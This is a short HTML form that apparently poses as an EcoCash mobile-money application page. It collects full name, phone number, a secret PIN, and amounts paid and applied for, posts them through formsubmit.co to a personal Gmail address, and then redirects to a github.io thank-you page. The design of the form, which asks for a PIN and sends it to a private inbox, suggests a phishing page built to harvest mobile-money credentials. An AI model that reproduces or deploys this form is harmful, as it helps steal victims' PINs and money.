<form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
  <label>Full Name</label><br>
  <input type="text" name="Full Name" required><br><br>

  <label>Phone Number</label><br>
  <input type="tel" name="Phone Number" required><br><br>

  <label>Secret Code (PIN)</label><br>
  <input type="password" name="Secret Code" id="pin" required>
  <input type="checkbox" onclick="togglePIN()"> Show/Hide PIN<br><br>

  <label>Amount You Paid</label><br>
  <input type="number" name="Amount Paid" required><br><br>

  <label>Amount You Applied For</label><br>
  <input type="number" name="Amount Applied For" required><br><br>

  <!-- Redirect to thank you page after submit -->
  <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/ecocash-form/thankyou.html">

  <button type="submit">Submit Application</button>
</form>

<script>
function togglePIN() {
  var pinField = document.getElementById("pin");
  pinField.type = pinField.type === "password" ? "text" : "password";
}
</script>
